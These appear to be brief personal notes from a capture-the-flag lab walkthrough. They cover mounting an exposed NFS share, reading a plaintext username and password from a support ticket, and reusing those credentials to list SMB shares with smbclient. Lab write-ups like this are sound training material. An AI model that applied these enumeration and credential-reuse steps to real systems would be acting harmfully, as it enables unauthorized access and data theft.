1.) scan port
2.)notice port 2049 NFS is open
3.)create an empty folder to attach mount
-mkdir ~/directoryname
4.)mount the nfs folder into that mount
-sudo mount -t nfs 10.129.8.4:/TechSupport ~/TechSupport_mount -o nolock
5.)view the files in that folder
-use sudo ls -la ~/TechSupport_mount is better than cd because it lets you immediately view the mounted files' contents and permissions as root (bypassing "Permission denied" errors caused by NFS squash/ownership)
6.)find the ticket with the username and password
-username is alex
-password is lol123!mD
7.earlier in the nmap scan we noticed the smb service was running on port 445
-try to sign into it using those credentials
-smbclient -L //10.129.9.192 -U 'alex%lol123!mD'

